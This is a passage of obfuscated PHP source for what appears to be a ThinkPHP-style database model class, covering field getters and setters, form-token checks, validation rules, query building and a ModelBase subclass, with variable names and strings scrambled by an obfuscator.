(isset($ÅïåÅ‡©[$ìÛ¹Ô–¯])) { $ÅïåÅ‡©[$¤÷Ü…] = $ÅïåÅ‡©[$ìÛ¹Ô–¯]; unset($ÅïåÅ‡©[$ìÛ¹Ô–¯]); } } } } return $ÅïåÅ‡©; } public function setField($–˜®ÉÑ, $âı£Œ¸÷ = '') { if (is_array($–˜®ÉÑ)) { $Æğ¦ˆƒ = $–˜®ÉÑ; } else { $Æğ¦ˆƒ[$–˜®ÉÑ] = $âı£Œ¸÷; } return $this->save($Æğ¦ˆƒ); } public function setAdd($ÒˆÆ†‘, $¯Û°úî¨ = 1) { $ŸŠë¨æè =& $_SERVER[¦»×‡Ãã]; $Úú­ˆÄ = $ÒˆÆ†‘ . $ŸŠë¨æè[372] . $¯Û°úî¨; if ($¯Û°úî¨ < 0) { $Úú­ˆÄ = $ÒˆÆ†‘ . $¯Û°úî¨; } return $this->setField($ÒˆÆ†‘, array($ŸŠë¨æè[373], $Úú­ˆÄ)); } public function getField($³ìõÓ•, $¼Ãùâ‚ = null) { $ò²€„ö =& $_SERVER[¦»×‡Ãã]; $ç¾šçÕê[$ò²€„ö[350]] = $³ìõÓ•; $ç¾šçÕê = $this->_parseOptions($ç¾šçÕê); $³ìõÓ• = trim($³ìõÓ•); if (strpos($³ìõÓ•, $ò²€„ö[50])) { if (!isset($ç¾šçÕê[$ò²€„ö[368]])) { $ç¾šçÕê[$ò²€„ö[368]] = is_numeric($¼Ãùâ‚) ? $¼Ãùâ‚ : $ò²€„ö[12]; } $âµœ¯ËÓ = $this->db->select($ç¾šçÕê); if (!empty($âµœ¯ËÓ)) { $‚‚¢À€å = explode($ò²€„ö[50], $³ìõÓ•); $³ìõÓ• = array_keys($âµœ¯ËÓ[0]); $ï×ì­³ó = array_shift($³ìõÓ•); $ÜÆö¯ü§ = array_shift($³ìõÓ•); $ğ™ŸºÛ  = array(); $ô’Ùã“ª = count($‚‚¢À€å); foreach ($âµœ¯ËÓ as $õÀÂäÆ) { $İâüÙú¹ = $õÀÂäÆ[$ï×ì­³ó]; if (2 == $ô’Ùã“ª) { $ğ™ŸºÛ [$İâüÙú¹] = $õÀÂäÆ[$ÜÆö¯ü§]; } else { $ğ™ŸºÛ [$İâüÙú¹] = is_string($¼Ãùâ‚) ? implode($¼Ãùâ‚, $õÀÂäÆ) : $õÀÂäÆ; } } return $ğ™ŸºÛ ; } } else { if (!0 !== $¼Ãùâ‚) { $ç¾šçÕê[$ò²€„ö[368]] = is_numeric($¼Ãùâ‚) ? $¼Ãùâ‚ : 1; } if ($¼Ãùâ‚ === $ò²€„ö[332]) { unset($ç¾šçÕê[$ò²€„ö[368]]); } $õÀÂäÆ = $this->db->select($ç¾šçÕê); if (!empty($õÀÂäÆ)) { if ($¼Ãùâ‚ === $ò²€„ö[332]) { return reset($õÀÂäÆ[0]); } if (!0 !== $¼Ãùâ‚ && 1 == $ç¾šçÕê[$ò²€„ö[368]]) { return reset($õÀÂäÆ[0]); } foreach ($õÀÂäÆ as $÷ã¥íÂ) { $·”Ñ‰ú[] = $÷ã¥íÂ[$³ìõÓ•]; } return $·”Ñ‰ú; } } return null; } public function create($İù˜•ö¸ = '', $ãûá¦Íö = '') { $¿™—ìÙ— =& $_SERVER[¦»×‡Ãã]; if (empty($İù˜•ö¸)) { $İù˜•ö¸ = $_POST; } elseif (is_object($İù˜•ö¸)) { $İù˜•ö¸ = get_object_vars($İù˜•ö¸); } if (empty($İù˜•ö¸) || !is_array($İù˜•ö¸)) { $this->error = think_lang($¿™—ìÙ—[348]); return !1; } $İù˜•ö¸ = $this->parseFieldsMap($İù˜•ö¸, 0); $ãûá¦Íö = $ãûá¦Íö ? $ãûá¦Íö : (!empty($İù˜•ö¸[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¿™—ìÙ—[350]])) { $·¢ßíôá = $this->options[$¿™—ìÙ—[350]]; unset($this->options[$¿™—ìÙ—[350]]); } elseif ($ãûá¦Íö == THINK_MODEL_INSERT && isset($this->insertFields)) { $·¢ßíôá = $this->insertFields; } elseif ($ãûá¦Íö == THINK_MODEL_UPDATE && isset($this->updateFields)) { $·¢ßíôá = $this->updateFields; } if (isset($·¢ßíôá)) { if (is_string($·¢ßíôá)) { $·¢ßíôá = explode($¿™—ìÙ—[50], $·¢ßíôá); } if (think_config($¿™—ìÙ—[374])) { $·¢ßíôá[] = think_config($¿™—ìÙ—[375]); } foreach ($İù˜•ö¸ as $šÀı×¨× => $”‹öÛ†ä) { if (!in_array($šÀı×¨×, $·¢ßíôá)) { unset($İù˜•ö¸[$šÀı×¨×]); } } } if (!$this->autoValidation($İù˜•ö¸, $ãûá¦Íö)) { return !1; } if (!$this->autoCheckToken($İù˜•ö¸)) { $this->error = think_lang($¿™—ìÙ—[376]); return !1; } if ($this->autoCheckFields) { $·¢ßíôá = $this->getDbFields(); foreach ($İù˜•ö¸ as $šÀı×¨× => $”‹öÛ†ä) { if (!in_array($šÀı×¨×, $·¢ßíôá)) { unset($İù˜•ö¸[$šÀı×¨×]); } elseif (MAGIC_QUOTES_GPC && is_string($”‹öÛ†ä)) { $İù˜•ö¸[$šÀı×¨×] = stripslashes($”‹öÛ†ä); } } } $this->autoOperation($İù˜•ö¸, $ãûá¦Íö); $this->data = $İù˜•ö¸; return $İù˜•ö¸; } public function autoCheckToken($¦òñøş) { $³›¯ÎıÖ =& $_SERVER[¦»×‡Ãã]; if (isset($this->options[$³›¯ÎıÖ[377]]) && !$this->options[$³›¯ÎıÖ[377]]) { return !0; } if (think_config($³›¯ÎıÖ[374])) { $ÆÛˆœÊÅ = think_config($³›¯ÎıÖ[375]); if (!isset($¦òñøş[$ÆÛˆœÊÅ]) || Session::get($ÆÛˆœÊÅ)) { return !1; } list($ûÈ¢„§Ú, $ÏÎÊˆ¾î) = explode($³›¯ÎıÖ[11], $¦òñøş[$ÆÛˆœÊÅ]); if ($ÏÎÊˆ¾î && Session::get($ÆÛˆœÊÅ . $³›¯ÎıÖ[10] . $ûÈ¢„§Ú) === $ÏÎÊˆ¾î) { Session::remove($ÆÛˆœÊÅ . $³›¯ÎıÖ[10] . $ûÈ¢„§Ú); return !0; } if (think_config($³›¯ÎıÖ[378])) { Session::remove($ÆÛˆœÊÅ . $³›¯ÎıÖ[10] . $ûÈ¢„§Ú); } return !1; } return !0; } public function regex($¯©×³è¼, $—™®ë™Ö) { $¢ ŒÒ”Í =& $_SERVER[¦»×‡Ãã]; $ºàïÛÊõ = array($¢ ŒÒ”Í[379] => $¢ ŒÒ”Í[380], $¢ ŒÒ”Í[381] => $¢ ŒÒ”Í[382], $¢ ŒÒ”Í[383] => $¢ ŒÒ”Í[384], $¢ ŒÒ”Í[385] => $¢ ŒÒ”Í[386], $¢ ŒÒ”Í[387] => $¢ ŒÒ”Í[388], $¢ ŒÒ”Í[389] => $¢ ŒÒ”Í[390], $¢ ŒÒ”Í[391] => $¢ ŒÒ”Í[392], $¢ ŒÒ”Í[366] => $¢ ŒÒ”Í[393], $¢ ŒÒ”Í[394] => $¢ ŒÒ”Í[395]); if (isset($ºàïÛÊõ[strtolower($—™®ë™Ö)])) { $—™®ë™Ö = $ºàïÛÊõ[strtolower($—™®ë™Ö)]; } return preg_match($—™®ë™Ö, $¯©×³è¼) === 1; } private function autoOperation(&$”âôíƒ, $†ôİ˜§‡) { $Šàù¸½— =& $_SERVER[¦»×‡Ãã]; if (!empty($this->options[$Šàù¸½—[396]])) { $ÜãÃü» = $this->options[$Šàù¸½—[396]]; unset($this->options[$Šàù¸½—[396]]); } elseif (!empty($this->_auto)) { $ÜãÃü» = $this->_auto; } if (isset($ÜãÃü»)) { foreach ($ÜãÃü» as $©¾ú¥ä¶) { if (empty($©¾ú¥ä¶[2])) { $©¾ú¥ä¶[2] = THINK_MODEL_INSERT; } if ($†ôİ˜§‡ == $©¾ú¥ä¶[2] || $©¾ú¥ä¶[2] == THINK_MODEL_BOTH) { switch (trim($©¾ú¥ä¶[3])) { case $Šàù¸½—[397]: case $Šàù¸½—[398]: $¥Ñ—½  = isset($©¾ú¥ä¶[4]) ? (array) $©¾ú¥ä¶[4] : array(); if (isset($”âôíƒ[$©¾ú¥ä¶[0]])) { array_unshift($¥Ñ—½ , $”âôíƒ[$©¾ú¥ä¶[0]]); } if ($Šàù¸½—[397] == $©¾ú¥ä¶[3]) { $”âôíƒ[$©¾ú¥ä¶[0]] = call_user_func_array($©¾ú¥ä¶[1], $¥Ñ—½ ); } else { $”âôíƒ[$©¾ú¥ä¶[0]] = call_user_func_array(array(&$this, $©¾ú¥ä¶[1]), $¥Ñ—½ ); } break; case $Šàù¸½—[350]: $”âôíƒ[$©¾ú¥ä¶[0]] = $”âôíƒ[$©¾ú¥ä¶[1]]; break; case $Šàù¸½—[399]: if ($Šàù¸½—[12] === $”âôíƒ[$©¾ú¥ä¶[0]]) { unset($”âôíƒ[$©¾ú¥ä¶[0]]); } break; case $Šàù¸½—[400]: default: $”âôíƒ[$©¾ú¥ä¶[0]] = $©¾ú¥ä¶[1]; } if (!1 === $”âôíƒ[$©¾ú¥ä¶[0]]) { unset($”âôíƒ[$©¾ú¥ä¶[0]]); } } } } return $”âôíƒ; } protected function autoValidation($ĞêÌ‘ŸÇ, $½ì„¦”ê) { $”ıŞÚ²¿ =& $_SERVER[¦»×‡Ãã]; if (!empty($this->options[$”ıŞÚ²¿[401]])) { $±ÓˆùÅ® = $this->options[$”ıŞÚ²¿[401]]; unset($this->options[$”ıŞÚ²¿[401]]); } elseif (!empty($this->_validate)) { $±ÓˆùÅ® = $this->_validate; } if (isset($±ÓˆùÅ®)) { if ($this->patchValidate) { $this->error = array(); } foreach ($±ÓˆùÅ® as $õô‘Şæ¾ => $Ø•Ÿí•”) { if (empty($Ø•Ÿí•”[5]) || $Ø•Ÿí•”[5] == THINK_MODEL_BOTH || $Ø•Ÿí•”[5] == $½ì„¦”ê) { if (0 == strpos($Ø•Ÿí•”[2], $”ıŞÚ²¿[402]) && strpos($Ø•Ÿí•”[2], $”ıŞÚ²¿[403])) { $Ø•Ÿí•”[2] = think_lang(substr($Ø•Ÿí•”[2], 2, -1)); } $Ø•Ÿí•”[3] = isset($Ø•Ÿí•”[3]) ? $Ø•Ÿí•”[3] : THINK_EXISTS_VALIDATE; $Ø•Ÿí•”[4] = isset($Ø•Ÿí•”[4]) ? $Ø•Ÿí•”[4] : $”ıŞÚ²¿[404]; switch ($Ø•Ÿí•”[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ĞêÌ‘ŸÇ, $Ø•Ÿí•”)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($”ıŞÚ²¿[12] != trim($ĞêÌ‘ŸÇ[$Ø•Ÿí•”[0]])) { if (!1 === $this->_validationField($ĞêÌ‘ŸÇ, $Ø•Ÿí•”)) { return !1; } } break; default: if (isset($ĞêÌ‘ŸÇ[$Ø•Ÿí•”[0]])) { if (!1 === $this->_validationField($ĞêÌ‘ŸÇ, $Ø•Ÿí•”)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($£•³ñÓ, $ı“‰½¶) { if (!1 === $this->_validationFieldItem($£•³ñÓ, $ı“‰½¶)) { if ($this->patchValidate) { $this->error[$ı“‰½¶[0]] = $ı“‰½¶[2]; } else { $this->error = $ı“‰½¶[2]; return !1; } } return; } protected function _validationFieldItem($‚òèí€„, $äÕ ¢áì) { $ç†„™Š¡ =& $_SERVER[¦»×‡Ãã]; switch (strtolower(trim($äÕ ¢áì[4]))) { case $ç†„™Š¡[397]: case $ç†„™Š¡[398]: $ÊıÏÑà˜ = isset($äÕ ¢áì[6]) ? (array) $äÕ ¢áì[6] : array(); if (is_string($äÕ ¢áì[0]) && strpos($äÕ ¢áì[0], $ç†„™Š¡[50])) { $äÕ ¢áì[0] = explode($ç†„™Š¡[50], $äÕ ¢áì[0]); } if (is_array($äÕ ¢áì[0])) { foreach ($äÕ ¢áì[0] as $ä„ş¹) { $´Çšà¶ [$ä„ş¹] = $‚òèí€„[$ä„ş¹]; } array_unshift($ÊıÏÑà˜, $´Çšà¶ ); } else { array_unshift($ÊıÏÑà˜, $‚òèí€„[$äÕ ¢áì[0]]); } if ($ç†„™Š¡[397] == $äÕ ¢áì[4]) { return call_user_func_array($äÕ ¢áì[1], $ÊıÏÑà˜); } else { return call_user_func_array(array(&$this, $äÕ ¢áì[1]), $ÊıÏÑà˜); } case $ç†„™Š¡[405]: return $‚òèí€„[$äÕ ¢áì[0]] == $‚òèí€„[$äÕ ¢áì[1]]; case $ç†„™Š¡[406]: if (is_string($äÕ ¢áì[0]) && strpos($äÕ ¢áì[0], $ç†„™Š¡[50])) { $äÕ ¢áì[0] = explode($ç†„™Š¡[50], $äÕ ¢áì[0]); } $—šë¸ç = array(); if (is_array($äÕ ¢áì[0])) { foreach ($äÕ ¢áì[0] as $ä„ş¹) { $—šë¸ç[$ä„ş¹] = $‚òèí€„[$ä„ş¹]; } } else { $—šë¸ç[$äÕ ¢áì[0]] = $‚òèí€„[$äÕ ¢áì[0]]; } if (!empty($‚òèí€„[$this->getPk()])) { $—šë¸ç[$this->getPk()] = array($ç†„™Š¡[407], $‚òèí€„[$this->getPk()]); } if ($this->where($—šë¸ç)->find()) { return !1; } return !0; default: return $this->check($‚òèí€„[$äÕ ¢áì[0]], $äÕ ¢áì[1], $äÕ ¢áì[4]); } } public function check($Â¤ùë¬ş, $ç¹ïúØ, $ÙãëıÒ = "\x72\145\147\x65\x78") { $ó¦—ùÂ¡ =& $_SERVER[¦»×‡Ãã]; $ÙãëıÒ = strtolower(trim($ÙãëıÒ)); switch ($ÙãëıÒ) { case $ó¦—ùÂ¡[7]: case $ó¦—ùÂ¡[408]: $ÃúäÆª = is_array($ç¹ïúØ) ? $ç¹ïúØ : explode($ó¦—ùÂ¡[50], $ç¹ïúØ); return $ÙãëıÒ == $ó¦—ùÂ¡[7] ? in_array($Â¤ùë¬ş, $ÃúäÆª) : !in_array($Â¤ùë¬ş, $ÃúäÆª); case $ó¦—ùÂ¡[409]: case $ó¦—ùÂ¡[410]: if (is_array($ç¹ïúØ)) { $¡ä¥Ùü• = $ç¹ïúØ[0]; $¡Çó¦ìÔ = $ç¹ïúØ[1]; } else { list($¡ä¥Ùü•, $¡Çó¦ìÔ) = explode($ó¦—ùÂ¡[50], $ç¹ïúØ); } return $ÙãëıÒ == $ó¦—ùÂ¡[409] ? $Â¤ùë¬ş >= $¡ä¥Ùü• && $Â¤ùë¬ş <= $¡Çó¦ìÔ : $Â¤ùë¬ş < $¡ä¥Ùü• || $Â¤ùë¬ş > $¡Çó¦ìÔ; case $ó¦—ùÂ¡[411]: case $ó¦—ùÂ¡[412]: return $ÙãëıÒ == $ó¦—ùÂ¡[411] ? $Â¤ùë¬ş == $ç¹ïúØ : $Â¤ùë¬ş != $ç¹ïúØ; case $ó¦—ùÂ¡[413]: $ÇÚ”Ş = mb_strlen($Â¤ùë¬ş, $ó¦—ùÂ¡[414]); if (strpos($ç¹ïúØ, $ó¦—ùÂ¡[50])) { list($¡ä¥Ùü•, $¡Çó¦ìÔ) = explode($ó¦—ùÂ¡[50], $ç¹ïúØ); return $ÇÚ”Ş >= $¡ä¥Ùü• && $ÇÚ”Ş <= $¡Çó¦ìÔ; } else { return $ÇÚ”Ş == $ç¹ïúØ; } case $ó¦—ùÂ¡[415]: list($úóŸ··ú, $Â•–Î“Ä) = explode($ó¦—ùÂ¡[50], $ç¹ïúØ); if (!is_numeric($úóŸ··ú)) { $úóŸ··ú = strtotime($úóŸ··ú); } if (!is_numeric($Â•–Î“Ä)) { $Â•–Î“Ä = strtotime($Â•–Î“Ä); } return NOW_TIME >= $úóŸ··ú && NOW_TIME <= $Â•–Î“Ä; case $ó¦—ùÂ¡[416]: return in_array(get_client_ip(), explode($ó¦—ùÂ¡[50], $ç¹ïúØ)); case $ó¦—ùÂ¡[417]: return !in_array(get_client_ip(), explode($ó¦—ùÂ¡[50], $ç¹ïúØ)); case $ó¦—ùÂ¡[404]: default: return $this->regex($Â¤ùë¬ş, $ç¹ïúØ); } } public function query($ÛíßİÓ, $»ğÀ¯Í– = false) { $ëæ½™Ñ =& $_SERVER[¦»×‡Ãã]; if (!is_bool($»ğÀ¯Í–) && !is_array($»ğÀ¯Í–)) { $»ğÀ¯Í– = func_get_args(); array_shift($»ğÀ¯Í–); } $ÛíßİÓ = str_replace(array($ëæ½™Ñ[262], $ëæ½™Ñ[418]), $ëæ½™Ñ[53], $ÛíßİÓ); $ÛíßİÓ = $this->parseSql($ÛíßİÓ, $»ğÀ¯Í–); return $this->db->query($ÛíßİÓ); } public function execute($â£•…Ç“, $ßø÷¿éã = false) { if (!is_bool($ßø÷¿éã) && !is_array($ßø÷¿éã)) { $ßø÷¿éã = func_get_args(); array_shift($ßø÷¿éã); } $â£•…Ç“ = $this->parseSql($â£•…Ç“, $ßø÷¿éã); return $this->db->execute($â£•…Ç“); } protected function parseSql($©²ÆºÔÔ, $¯¼£†¸‹) { $Ëå‹ıò =& $_SERVER[¦»×‡Ãã]; if (!0 === $¯¼£†¸‹) { $›Ä•Ìãæ = $this->_parseOptions(); $©²ÆºÔÔ = $this->db->parseSql($©²ÆºÔÔ, $›Ä•Ìãæ); } elseif (is_array($¯¼£†¸‹)) { $¯¼£†¸‹ = array_map(array($this->db, $Ëå‹ıò[419]), $¯¼£†¸‹); $©²ÆºÔÔ = vsprintf($©²ÆºÔÔ, $¯¼£†¸‹); } else { $©²ÆºÔÔ = strtr($©²ÆºÔÔ, array($Ëå‹ıò[420] => $this->getTableName(), $Ëå‹ıò[421] => think_config($Ëå‹ıò[321]))); } $this->db->setModel($this->name); return $©²ÆºÔÔ; } public function db($³¿ğŠë’ = '', $ş²ã¼øó = '', $şêÒ˜Îø = array()) { $‘¢Ø¡Ğ© =& $_SERVER[¦»×‡Ãã]; if ($‘¢Ø¡Ğ©[12] === $³¿ğŠë’ && $this->db) { return $this->db; } static $å¨¯Àˆ” = array(); static $Ùôïó­è = array(); if (!isset($Ùôïó­è[$³¿ğŠë’]) || isset($Ùôïó­è[$³¿ğŠë’]) && $ş²ã¼øó && $å¨¯Àˆ”[$³¿ğŠë’] != $ş²ã¼øó) { if (!empty($ş²ã¼øó) && is_string($ş²ã¼øó) && !1 === strpos($ş²ã¼øó, $‘¢Ø¡Ğ©[8])) { $ş²ã¼øó = think_config($ş²ã¼øó); } $³¿ğŠë’ = think_guid($ş²ã¼øó); $Ùôïó­è[$³¿ğŠë’] = Db::getInstance($ş²ã¼øó); } elseif (NULL === $ş²ã¼øó) { $Ùôïó­è[$³¿ğŠë’]->close(); unset($Ùôïó­è[$³¿ğŠë’]); return; } if (!empty($şêÒ˜Îø)) { if (is_string($şêÒ˜Îø)) { parse_str($şêÒ˜Îø, $şêÒ˜Îø); } foreach ($şêÒ˜Îø as $®ŠÕÂèå => $Çë–¹åõ) { $this->setProperty($®ŠÕÂèå, $Çë–¹åõ); } } $å¨¯Àˆ”[$³¿ğŠë’] = $ş²ã¼øó; $this->db = $Ùôïó­è[$³¿ğŠë’]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Ÿ¶ÙÔ¯ú = get_class($this); if ($Ÿ¶ÙÔ¯ú == $_SERVER[¦»×‡Ãã][422]) { return $this->name; } $this->name = substr($Ÿ¶ÙÔ¯ú, 0, -5); } return $this->name; } public function getTableName() { $±œ˜Šíˆ =& $_SERVER[¦»×‡Ãã]; if (empty($this->trueTableName)) { $Ô¥ø˜Ğ™ = !empty($this->tablePrefix) ? $this->tablePrefix : $±œ˜Šíˆ[12]; if (!empty($this->tableName)) { $Ô¥ø˜Ğ™ .= $this->tableName; } else { $Ô¥ø˜Ğ™ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ô¥ø˜Ğ™); } return (!empty($this->dbName) ? $this->dbName . $±œ˜Šíˆ[10] : $±œ˜Šíˆ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $İÄ‡éÑ =& $_SERVER[¦»×‡Ãã]; return isset($this->fields[$İÄ‡éÑ[328]]) ? $this->fields[$İÄ‡éÑ[328]] : $this->pk; } public function getDbFields() { $à¢¤‘ıÍ =& $_SERVER[¦»×‡Ãã]; if (isset($this->options[$à¢¤‘ıÍ[356]])) { $™èÈ‚Ÿ¸ = $this->db->getFields($this->options[$à¢¤‘ıÍ[356]]); return $™èÈ‚Ÿ¸ ? array_keys($™èÈ‚Ÿ¸) : !1; } if ($this->fields) { $™èÈ‚Ÿ¸ = $this->fields; unset($™èÈ‚Ÿ¸[$à¢¤‘ıÍ[327]], $™èÈ‚Ÿ¸[$à¢¤‘ıÍ[328]], $™èÈ‚Ÿ¸[$à¢¤‘ıÍ[329]], $™èÈ‚Ÿ¸[$à¢¤‘ıÍ[326]]); return $™èÈ‚Ÿ¸; } return !1; } public function data($‚úÏåë = '') { $šˆß¬Êä =& $_SERVER[¦»×‡Ãã]; if ($šˆß¬Êä[12] === $‚úÏåë && !empty($this->data)) { return $this->data; } if (is_object($‚úÏåë)) { $‚úÏåë = get_object_vars($‚úÏåë); } elseif (is_string($‚úÏåë)) { parse_str($‚úÏåë, $‚úÏåë); } elseif (!is_array($‚úÏåë)) { think_exception(think_lang($šˆß¬Êä[348])); } $this->data = $‚úÏåë; return $this; } public function join($–÷Ì¡×ë) { $°œşÈÈÉ =& $_SERVER[¦»×‡Ãã]; if (is_array($–÷Ì¡×ë)) { $this->options[$°œşÈÈÉ[359]] = $–÷Ì¡×ë; } elseif (!empty($–÷Ì¡×ë)) { $this->options[$°œşÈÈÉ[359]][] = $–÷Ì¡×ë; } return $this; } public function union($ØŸÁ¦‹, $€·ªÏï  = false) { $‚Øè¢  =& $_SERVER[¦»×‡Ãã]; if (empty($ØŸÁ¦‹)) { return $this; } if ($€·ªÏï ) { $this->options[$‚Øè¢ [423]][$‚Øè¢ [424]] = !0; } if (is_object($ØŸÁ¦‹)) { $ØŸÁ¦‹ = get_object_vars($ØŸÁ¦‹); } if (is_string($ØŸÁ¦‹)) { $Ã…‚©Ì® = $ØŸÁ¦‹; } elseif (is_array($ØŸÁ¦‹)) { if (isset($ØŸÁ¦‹[0])) { $this->options[$‚Øè¢ [423]] = array_merge($this->options[$‚Øè¢ [423]], $ØŸÁ¦‹); return $this; } else { $Ã…‚©Ì® = $ØŸÁ¦‹; } } else { think_exception(think_lang($‚Øè¢ [348])); } $this->options[$‚Øè¢ [423]][] = $Ã…‚©Ì®; return $this; } public function cache($–¡÷€¼ü = true, $úÕ­Å™À = null, $è¼àñœÂ = '') { $±•áªÏ§ =& $_SERVER[¦»×‡Ãã]; if (!1 !== $–¡÷€¼ü) { $this->options[$±•áªÏ§[425]] = array($±•áªÏ§[97] => $–¡÷€¼ü, $±•áªÏ§[415] => $úÕ­Å™À, $±•áªÏ§[33] => $è¼àñœÂ); } return $this; } public function field($·İÅ¬Ãå, $ÊÍ”¥Áİ = false) { $ªèè¸é‡ =& $_SERVER[¦»×‡Ãã]; if (!0 === $·İÅ¬Ãå) { $ÇÓÈ• Æ = $this->getDbFields(); $·İÅ¬Ãå = $ÇÓÈ• Æ ? $ÇÓÈ• Æ : $ªèè¸é‡[220]; } elseif ($ÊÍ”¥Áİ) { if (is_string($·İÅ¬Ãå)) { $·İÅ¬Ãå = explode($ªèè¸é‡[50], $·İÅ¬Ãå); } $ÇÓÈ• Æ = $this->getDbFields(); $·İÅ¬Ãå = $ÇÓÈ• Æ ? array_diff($ÇÓÈ• Æ, $·İÅ¬Ãå) : $·İÅ¬Ãå; } $this->options[$ªèè¸é‡[350]] = $·İÅ¬Ãå; return $this; } public function scope($ùñ…ıÔ¿ = '', $ÖÃ´‰ä“ = NULL) { $—ã®¾‡Ñ =& $_SERVER[¦»×‡Ãã]; if ($—ã®¾‡Ñ[12] === $ùñ…ıÔ¿) { if (isset($this->_scope[$—ã®¾‡Ñ[37]])) { $é†ú€À = $this->_scope[$—ã®¾‡Ñ[37]]; } else { return $this; } } elseif (is_string($ùñ…ıÔ¿)) { $¿‰èşôõ = explode($—ã®¾‡Ñ[50], $ùñ…ıÔ¿); $é†ú€À = array(); foreach ($¿‰èşôõ as $áî‡øÂ”) { if (!isset($this->_scope[$áî‡øÂ”])) { continue; } $é†ú€À = array_merge($é†ú€À, $this->_scope[$áî‡øÂ”]); } if (!empty($ÖÃ´‰ä“) && is_array($ÖÃ´‰ä“)) { $é†ú€À = array_merge($é†ú€À, $ÖÃ´‰ä“); } } elseif (is_array($ùñ…ıÔ¿)) { $é†ú€À = $ùñ…ıÔ¿; } if (is_array($é†ú€À) && !empty($é†ú€À)) { $this->options = array_merge($this->options, array_change_key_case($é†ú€À)); } return $this; } public function where($µ×ú’è°, $í¹¾çê× = null) { $È¨ä»ñ =& $_SERVER[¦»×‡Ãã]; if (!is_null($í¹¾çê×) && is_string($µ×ú’è°)) { if (!is_array($í¹¾çê×)) { $í¹¾çê× = func_get_args(); array_shift($í¹¾çê×); } $í¹¾çê× = array_map(array($this->db, $È¨ä»ñ[419]), $í¹¾çê×); $µ×ú’è° = vsprintf($µ×ú’è°, $í¹¾çê×); } elseif (is_object($µ×ú’è°)) { $µ×ú’è° = get_object_vars($µ×ú’è°); } elseif (is_array($µ×ú’è°)) { foreach ($µ×ú’è° as $œÊë¼ƒ¹ => $´ï÷÷œ) { if ((is_numeric($œÊë¼ƒ¹) || !$œÊë¼ƒ¹) && is_string($´ï÷÷œ)) { if (strpos($´ï÷÷œ, $È¨ä»ñ[426]) === 0) { continue; } think_trace($È¨ä»ñ[427], $È¨ä»ñ[12], $È¨ä»ñ[49]); die; } } } if (is_string($µ×ú’è°) && $È¨ä»ñ[12] != $µ×ú’è°) { $ŸÊ˜«›û = array(); $ŸÊ˜«›û[$È¨ä»ñ[428]] = $µ×ú’è°; $µ×ú’è° = $ŸÊ˜«›û; } if (isset($this->options[$È¨ä»ñ[352]])) { $this->options[$È¨ä»ñ[352]] = array_merge($this->options[$È¨ä»ñ[352]], $µ×ú’è°); } else { $this->options[$È¨ä»ñ[352]] = $µ×ú’è°; } return $this; } public function limit($¾·­”¦ç, $‰®­×± = null) { $£‘åóö« =& $_SERVER[¦»×‡Ãã]; $this->options[$£‘åóö«[368]] = is_null($‰®­×±) ? $¾·­”¦ç : $¾·­”¦ç . $£‘åóö«[50] . $‰®­×±; return $this; } public function page($ãÑ¸äÃı, $ÜÍí„Í– = null) { $€Ê©ÙÏİ =& $_SERVER[¦»×‡Ãã]; $this->options[$€Ê©ÙÏİ[429]] = is_null($ÜÍí„Í–) ? $ãÑ¸äÃı : $ãÑ¸äÃı . $€Ê©ÙÏİ[50] . $ÜÍí„Í–; return $this; } public function comment($â½¶–×·) { $this->options[$_SERVER[¦»×‡Ãã][430]] = $â½¶–×·; return $this; } public function setProperty($Ø±°Ûç, $™À†ŠÌ) { if (property_exists($this, $Ø±°Ûç)) { $this->{$Ø±°Ûç} = $™À†ŠÌ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\151\155\x65", "\x74\151\155\x65", "\x69\x6e\163\145\x72\164\x2c\165\160\x64\141\x74\x65", "\x66\x75\156\143\164\x69\157\156"), array("\x63\x72\145\x61\x74\x65\124\151\x6d\145", "\164\x69\155\x65", "\x69\x6e\163\145\x72\x74", "\x66\165\156\143\x74\151\157\156")); public function setDataAuto($İÜÙÜ“È) { $this->dataAuto = $İÜÙÜ“È; } public function __construct($îóÖ‰Ù = '', $·²Áú»¶ = '', $„²­•â… = '') { parent::__construct($îóÖ‰Ù, $·²Áú»¶, $„²­•â…); } protected $tableMeta = array(); protected function _beforeInsert(&$‡æ¶€À·, $«ÛÌóÍ») { $‚üƒôŞß =& $_SERVER[¦»×‡Ãã]; if (!$this->checkDataAutoHas($‚üƒôŞß[431])) { return; } $this->dataBeforeFilter($‡æ¶€À·, $‚üƒôŞß[431]); } protected function _beforeUpdate(&$ âÚ„óõ, $ÉØñ§) { $“«á²Â =& $_SERVER[¦»×‡Ãã]; if (!$this->checkDataAutoHas($“«á²Â[432])) { return; } $this->dataBeforeFilter($ âÚ„óõ, $“«á²Â[432]); } protected function _afterSelect(&$Íº€ÑÄ°, $ìŸšîÛß) { if (!is_array($Íº€ÑÄ°)) { return; } if (!$this->checkDataAutoHas($_SERVER[¦»×‡Ãã][433])) { return; } foreach ($Íº€ÑÄ° as &$¾‹Ì´‚×) { $this->dataAfterFilter($¾‹Ì´‚×); } unset($¾‹Ì´‚×); } protected function _afterFind(&$õóïçŸ–, $öÚ¦£İÜ) { if (!is_array($õóïçŸ–)) { return; } if (!$this->checkDataAutoHas($_SERVER[¦»×‡Ãã][433])) { return; } $this->dataAfterFilter($õóïçŸ–); } public static function textEncode($§ßÉ¾á) { if (!$§ßÉ¾á) { return $§ßÉ¾á; } $Ê—çÎº = json_encode($§ßÉ¾á); $Ê—çÎº = preg_replace_callback($_SERVER[¦»×‡Ãã][434], function ($ûàË™‹ˆ) { return addslashes($ûàË™‹ˆ[0]); }, $Ê—çÎº); return json_decode($Ê—çÎº); } public static function textDecode($½¾úÔÃè) { $Ú…ü‚µ  =& $_SERVER[¦»×‡Ãã]; $’ğ÷š‚É = json_encode($½¾úÔÃè); 